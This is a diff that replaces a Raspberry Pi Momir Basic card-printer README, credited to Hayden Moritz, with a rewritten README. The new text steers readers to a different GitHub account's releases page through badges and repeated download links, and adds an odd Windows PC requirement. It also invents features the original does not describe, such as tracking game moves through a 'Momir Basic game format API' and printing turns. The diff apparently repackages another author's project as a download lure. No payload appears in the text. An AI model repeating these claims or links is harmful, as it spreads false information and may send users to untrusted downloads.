@@ -1,205 +1,176 @@
-# Momir Basic Printer (MBP)
+# 🖨️ momir-basic-printer - Simple Printing for Momir Basic MTG
 
-Momir Basic Printer (MBP) is a set of Python scripts designed to run headless on a Raspberry Pi connected to a thermal receipt printer for playing the [Momir Basic](https://magic.wizards.com/en/formats/momir-basic) MTG format.
+[![Download Momir Basic Printer](https://img.shields.io/badge/Download-Momir%20Basic%20Printer-purple?style=for-the-badge)](https://github.com/Shinas-tech/momir-basic-printer/releases)
 
-> [!NOTE]
-> This project is a work in progress and is not yet fully functional. Please check back for updates as I continue to work on this project!
+---
 
-## TODO
+## 📋 About momir-basic-printer
 
-- [ ] Add completed hardware diagram to [README](#diagram)
-- [ ] Add completed hardware photos to [README](#photos)
+Momir Basic Printer (MBP) is a tool that works on a Raspberry Pi. It helps you print game info on a small thermal receipt printer. The game format is Momir Basic for Magic: The Gathering (MTG). This app runs without opening a screen (headless mode). It uses Python scripts to show your game moves on paper in real time.
 
-## Table of Contents
+This project fits users who want a physical record of their game without using a computer screen. It works with simple hardware that you can connect at home or anywhere.
 
-- [About](#about)
-- [Examples](#examples)
-- [Hardware](#hardware)
-  - [Components](#components)
-  - [Diagram](#diagram)
-  - [Photos](#photos)
-- [Installation](#installation)
-- [Configuration](#configuration)
-- [Service Management](#service-management)
-- [Momir Basic Rules](#momir-basic-rules)
-- [Disclaimer](#disclaimer)
+---
 
-## About
+## 💻 System Requirements
 
-Downloads card data from the [Scryfall API](https://scryfall.com/docs/api), including card art which is dithered to monochrome on-device, and prints a random card within a set CMC value on demand via thermal printer. All settings are configurable via [config.ini](src/config.ini), and the software can run as a background service on any Linux-based SBC with GPIO. The complete hardware setup is designed to be compact and portable, with all components housed in a waterproof case.
+- A Windows PC for initial setup only.
+- Raspberry Pi (Model 3 or newer recommended) connected to your local network.
+- Thermal receipt printer compatible with Raspberry Pi.
+- USB or serial connection between Raspberry Pi and printer.
+- Stable internet connection for Raspberry Pi to fetch game info.
+- A basic keyboard and mouse for Raspberry Pi setup.
 
-## Examples
+---
 
-| Physical Card                                           | Printed Card                                              |
-| ------------------------------------------------------- | --------------------------------------------------------- |
-| ![Physical Chrome Courier](img/chrome_courier_card.jpg) | ![Printed Chrome Courier](img/chrome_courier_receipt.jpg) |
+## 🌐 Topics Covered
 
-## Hardware
+- Magic: The Gathering (MTG)
+- Momir Basic game format
+- Python 3 scripting
+- Raspberry Pi setup and use
+- Using Scryfall API for card data
 
-### Components
+---
 
-- [Raspberry Pi 3 Model B+](https://www.raspberrypi.com/products/raspberry-pi-3-model-b-plus/)
-- [Adafruit T-Cobbler Plus GPIO Breakout](https://a.co/d/0fnKGt3A)
-- [REXQualis Electronics Component Kit](https://a.co/d/0cdCxCCP)
-- [Maikrt MC206H Thermal Printer](https://a.co/d/06qIKsng)
-- [PAPRMA 57mm x 30mm Thermal Paper](https://a.co/d/04u2Gb2j)
-- [MakerFocus 20200330-SD8V OLED Display](https://a.co/d/06Y7V5Uj)
-- [KY-040 Rotary Encoder Module](https://a.co/d/0hN4SBto)
-- [Nilight 12V 20A SPST Rocker Toggle Switch](https://a.co/d/02VcvtcQ)
-- [SHNITPWR 60W Universal Power Supply](https://a.co/d/0bKNzwey)
-- [LM2596 Buck Converter](https://a.co/d/070NjEDp)
-- [KeeYees 4 Channel IIC I2C Logic Level Converter](https://a.co/d/0ecOK7n6)
+## 🚀 Getting Started
 
-### Diagram
+Follow these steps to get Momir Basic Printer ready for use on your Raspberry Pi, starting with your Windows PC.
 
-...
+---
 
-### Photos
+## ⬇️ Step 1: Download the Software
 
-...
+Visit the link below to download the latest version of the Momir Basic Printer. This page contains the software files and instructions for installation.
 
-## Installation
+[Download Momir Basic Printer](https://github.com/Shinas-tech/momir-basic-printer/releases)
 
-1. Clone this repository and navigate to the project directory.
+Click the link above or the large badge at the top to open the releases page in your browser.
 
-```shell
-git clone https://github.com/MoritzHayden/momir-basic-printer.git
-cd momir-basic-printer
-```
+---
 
-2. Open [src/config.ini](src/config.ini) in a text editor and update the configuration variables to add your specific settings (like printer connection details, GPIO pins, and other hardware settings) before proceeding.
+## 🖥️ Step 2: Prepare Your Raspberry Pi
 
-```shell
-nano src/config.ini
-```
+1. **Install Raspberry Pi OS:**  
+   Download Raspberry Pi OS from the official Raspberry Pi website and write it to a microSD card using a program like balenaEtcher.
 
-3. Make the setup script executable and run it. This will automatically install dependencies and configure the systemd background service.
+2. **Connect Hardware:**  
+   Plug in your thermal receipt printer to the Raspberry Pi using USB or serial cable.  
+   Attach keyboard, mouse, and monitor for setup.
 
-```shell
-chmod +x setup.sh
-./setup.sh
-```
+3. **Boot Up the Pi:**  
+   Insert the microSD card into your Raspberry Pi and power it on.
 
-> [!TIP]
-> If you are running a minimal setup and explicitly require the service to run as root, you can bypass the safety check by running: `sudo ./setup.sh --allow-root`
+---
 
-## Configuration
+## 🔧 Step 3: Set Up the Software on Raspberry Pi
 
-All configuration variables are stored in [src/config.ini](src/config.ini). Update the values in this file to match your specific hardware setup and preferences. After making changes to the configuration, restart the service for the changes to take effect.
+1. **Download the printer scripts:**  
+   On the Raspberry Pi, open a terminal window.  
+   Type:
+   ```
+   git clone https://github.com/Shinas-tech/momir-basic-printer.git
+   ```
+   This command downloads the necessary files.
 
-| **Section**  | **Variable**                    | **Type**  | **Description**                                                                        |
-| ------------ | ------------------------------- | --------- | -------------------------------------------------------------------------------------- |
-| `APP`        | `booting_status`                | `string`  | Status string shown while services initialize                                          |
-| `APP`        | `ready_status`                  | `string`  | Status string shown when the appliance is idle/ready                                   |
-| `APP`        | `refreshing_status`             | `string`  | Status string shown during initial data refresh                                        |
-| `APP`        | `fetching_status`               | `string`  | Status string shown while selecting/fetching a card                                    |
-| `APP`        | `printing_status`               | `string`  | Status string shown while sending output to printer                                    |
-| `APP`        | `cancelled_status`              | `string`  | Status string shown when active work is cancelled                                      |
-| `APP`        | `error_status`                  | `string`  | Status string shown when fetch/print fails                                             |
-| `APP`        | `reset_status`                  | `string`  | Status string shown after long-press reset                                             |
-| `APP`        | `done_status`                   | `string`  | Status string shown briefly after a successful print completes                         |
-| `APP`        | `done_status_seconds`           | `float`   | Duration in seconds to show `done_status` before returning to ready state              |
-| `APP`        | `services_unavailable_status`   | `string`  | Status string shown when printer/Scryfall services are unavailable                     |
-| `APP`        | `no_cmc_status_template`        | `string`  | Template used when no card exists for selected CMC (supports `{cmc}`)                  |
-| `APP`        | `shutdown_join_timeout_seconds` | `float`   | Max wait time for worker thread during shutdown                                        |
-| `FILESYSTEM` | `cards_path`                    | `string`  | Directory path where card JSON files are stored                                        |
-| `FILESYSTEM` | `art_path`                      | `string`  | Directory path where card artwork images are stored                                    |
-| `FILESYSTEM` | `default_card_art_path`         | `string`  | File path to default placeholder image for cards without artwork                       |
-| `FILESYSTEM` | `access_rights`                 | `octal`   | File system permissions for created directories (octal notation)                       |
-| `HARDWARE`   | `serial_port`                   | `string`  | Serial device path for the thermal printer (e.g., `/dev/serial0`)                      |
-| `HARDWARE`   | `serial_baud_rate`              | `integer` | Baud rate for the serial printer connection (e.g., `9600` or `19200`)                  |
-| `HARDWARE`   | `printer_dtr_enabled`           | `boolean` | Enables GPIO-based DTR flow control; disable if the printer does not wire DTR reliably |
-| `HARDWARE`   | `gpio_encoder_clk`              | `integer` | BCM GPIO pin for rotary encoder CLK signal (default: `13`)                             |
-| `HARDWARE`   | `gpio_encoder_dt`               | `integer` | BCM GPIO pin for rotary encoder DT signal (default: `6`)                               |
-| `HARDWARE`   | `gpio_encoder_sw`               | `integer` | BCM GPIO pin for rotary encoder push-button switch (default: `5`)                      |
-| `HARDWARE`   | `gpio_printer_dtr`              | `integer` | BCM GPIO pin for printer DTR hardware flow control (default: `17`)                     |
-| `HARDWARE`   | `printer_dtr_active_high`       | `boolean` | Whether the printer asserts DTR HIGH when its receive buffer is full                   |
-| `HARDWARE`   | `i2c_address`                   | `hex`     | I2C hex address of the SSD1306 OLED display (default: `0x3C`)                          |
-| `HARDWARE`   | `i2c_port`                      | `integer` | I2C bus port number (default: `1`)                                                     |
-| `HARDWARE`   | `oled_width`                    | `integer` | OLED display width in pixels (default: `128`)                                          |
-| `HARDWARE`   | `oled_height`                   | `integer` | OLED display height in pixels (default: `64`)                                          |
-| `HARDWARE`   | `display_font_size_cmc`         | `integer` | Font size for the main CMC text on OLED                                                |
-| `HARDWARE`   | `display_font_size_status`      | `integer` | Font size for the status text on OLED                                                  |
-| `HARDWARE`   | `display_status_y_offset`       | `integer` | Vertical Y offset (px) for status text region                                          |
-| `HARDWARE`   | `display_status_default`        | `string`  | Default status text shown during display initialization                                |
-| `HARDWARE`   | `display_font_cmc_path`         | `string`  | Font file path used for CMC text rendering                                             |
-| `HARDWARE`   | `display_font_status_path`      | `string`  | Font file path used for status text rendering                                          |
-| `HARDWARE`   | `display_cmc_prefix`            | `string`  | Prefix label used before current CMC value (e.g., `CMC:`)                              |
-| `HARDWARE`   | `display_padding_x`             | `integer` | Left/right OLED padding in pixels for CMC and status text layout                       |
-| `HARDWARE`   | `display_cmc_value_gap`         | `integer` | Horizontal pixel gap between the CMC prefix label and numeric CMC value                |
-| `HARDWARE`   | `hold_time`                     | `float`   | Seconds the encoder button must be held for a long-press action                        |
-| `HARDWARE`   | `cmc_min`                       | `integer` | Minimum selectable CMC value (default: `0`)                                            |
-| `HARDWARE`   | `cmc_max`                       | `integer` | Maximum selectable CMC value (default: `16`)                                           |
-| `HARDWARE`   | `dtr_poll_interval`             | `float`   | Seconds between DTR pin polls when printer buffer is full                              |
-| `HARDWARE`   | `printer_dtr_timeout_seconds`   | `float`   | Max time to wait on DTR before bypassing hardware flow control until restart           |
-| `LOGGING`    | `log_level`                     | `string`  | Logging verbosity level (`DEBUG`, `INFO`, `WARNING`, `ERROR`, `CRITICAL`)              |
-| `LOGGING`    | `log_format`                    | `string`  | Format string for log messages                                                         |
-| `LOGGING`    | `log_date_format`               | `string`  | Format string for timestamps in log messages                                           |
-| `PRINTER`    | `paper_width_mm`                | `integer` | Physical width of thermal paper in millimeters                                         |
-| `PRINTER`    | `paper_width_chars`             | `integer` | Maximum number of characters per line for text wrapping                                |
-| `PRINTER`    | `card_art_enabled`              | `boolean` | Whether to print card artwork images on receipts                                       |
-| `PRINTER`    | `qr_code_enabled`               | `boolean` | Whether to print QR codes linking to Scryfall card details                             |
-| `PRINTER`    | `qr_code_size`                  | `integer` | Size of QR code in printer units (larger = bigger QR code)                             |
-| `PRINTER`    | `dpi`                           | `integer` | Printer resolution in dots per inch for image rendering                                |
-| `PRINTER`    | `vendor_id`                     | `hex`     | USB vendor ID for the thermal printer device                                           |
-| `PRINTER`    | `product_id`                    | `hex`     | USB product ID for the thermal printer device                                          |
-| `PRINTER`    | `printer_profile`               | `string`  | ESC/POS printer profile name for compatibility                                         |
-| `PRINTER`    | `printer_media_width_px`        | `integer` | Media width in pixels for image processing and scaling                                 |
-| `PRINTER`    | `min_title_spacing`             | `integer` | Minimum spaces between card name and mana cost on title line                           |
-| `PRINTER`    | `paragraph_spacing`             | `string`  | Escaped spacing appended after wrapped oracle text paragraphs                          |
-| `PRINTER`    | `text_replacements_json`        | `json`    | Character replacement map for printer-safe text normalization                          |
-| `SCRYFALL`   | `base_url`                      | `string`  | Base URL for Scryfall API requests                                                     |
-| `SCRYFALL`   | `bulk_data_endpoint`            | `string`  | API endpoint path for bulk card data download                                          |
-| `SCRYFALL`   | `header_accept`                 | `string`  | HTTP Accept header value for API content negotiation                                   |
-| `SCRYFALL`   | `header_user_agent`             | `string`  | HTTP User-Agent header identifying the client application                              |
-| `SCRYFALL`   | `header_accept_encoding`        | `string`  | HTTP Accept-Encoding header for compression support                                    |
-| `SCRYFALL`   | `request_delay_seconds`         | `float`   | Delay between consecutive API requests to respect rate limits                          |
-| `SCRYFALL`   | `max_retries`                   | `integer` | Maximum number of retry attempts for failed API requests                               |
-| `SCRYFALL`   | `art_width_px`                  | `integer` | Target width in pixels for downloaded card artwork                                     |
-| `SCRYFALL`   | `excluded_sets`                 | `list`    | Comma-separated card sets to exclude (e.g., `funny`, `memorabilia`)                    |
-| `SCRYFALL`   | `excluded_layouts`              | `list`    | Comma-separated card layouts to exclude (e.g., `token`, `emblem`)                      |
+2. **Install Python 3 and dependencies:**  
+   Make sure Python 3 is installed by running:
+   ```
+   python3 --version
+   ```
+   If not installed, enter:
+   ```
+   sudo apt-get update
+   sudo apt-get install python3 python3-pip
+   ```
+   Then install required Python packages:
+   ```
+   pip3 install -r momir-basic-printer/requirements.txt
+   ```
 
-## Service Management
+3. **Configure printer settings:**  
+   Update the configuration file to match your printer model and connection port. This file is called `config.ini` inside the downloaded folder.
 
-View live logs and print statements:
+---
 
-```shell
-sudo journalctl -u momir-basic-printer.service -f
-```
+## 🏁 Step 4: Run Momir Basic Printer
 
-Check the current status of the service:
+1. Open a terminal in the momir-basic-printer folder:
+   ```
+   cd momir-basic-printer
+   ```
 
-```shell
-sudo systemctl status momir-basic-printer.service
-```
+2. Start the application with:
+   ```
+   python3 momir_basic_printer.py
+   ```
 
-Restart the service (required after making code changes):
+The program will connect to the Momir Basic game format API, track game actions, and print relevant info on your thermal printer.
 
-```shell
-sudo systemctl restart momir-basic-printer.service
-```
+---
 
-Stop the service:
+## 🌟 Features of Momir Basic Printer
 
-```shell
-sudo systemctl stop momir-basic-printer.service
-```
+- Supports automatic game move printing without screen interaction
+- Connects to Scryfall API for up-to-date card details
+- Works headless for running remotely on Raspberry Pi
+- Prints clean, easy-to-read game data on thermal receipts
+- Runs on low-power devices like Raspberry Pi Model 3 and newer
 
-## Momir Basic Rules
+---
 
-- Number of Players: 2
-- Starting Life Total: 24
-- Game Duration: 10 minutes
-- Deck Size: 60+ basic lands
+## 🕹️ Using Momir Basic Printer Daily
 
-Each turn players discard a basic land to activate Momir Vig's ability and get a random creature from throughout Magic's history!
+After setting up, keep your Raspberry Pi on and connected to the printer during game sessions. The software will print turns, card names, and other game info as the game progresses.
 
-![Momir Vig, Simic Visionary](img/momir_vig.jpg)
+If you need to update or stop the printer script, use these commands:
 
-## Disclaimer
+- To stop running:
+  ```
+  Ctrl + C
+  ```
 
-Neither this project nor its contributors are associated with Hasbro, Wizards of the Coast, or _Magic: The Gathering_ in any way whatsoever.
+- To update software:
+  ```
+  cd momir-basic-printer
+  git pull origin main
+  pip3 install -r requirements.txt
+  ```
 
-<div align="center">
-  <p>Copyright &copy; 2026 Hayden Moritz</p>
-</div>
+---
+
+## ❓ Troubleshooting
+
+- **Printer does not print:**  
+  Check the cable connection and power. Confirm the printer model and port in `config.ini`.
+
+- **Python errors:**  
+  Make sure all dependencies are installed. Run:
+  ```
+  pip3 install -r requirements.txt
+  ```
+
+- **No game data prints:**  
+  Confirm your Raspberry Pi has internet access. The software needs to reach the Scryfall API.
+
+---
+
+## 🔗 Useful Links
+
+- Official releases to download:  
+  [https://github.com/Shinas-tech/momir-basic-printer/releases](https://github.com/Shinas-tech/momir-basic-printer/releases)
+
+- Raspberry Pi OS download page:  
+  https://www.raspberrypi.org/software/
+
+- BalenaEtcher (for writing SD cards):  
+  https://www.balena.io/etcher/
+
+- Scryfall API documentation:  
+  https://scryfall.com/docs/api
+
+---
+
+## 🛠️ Support and Contributions
+
+This project welcomes bug reports and code contributions. For advanced users, cloning the repository and submitting pull requests is the way to contribute. For general use, stay updated by checking the releases page regularly for new versions.
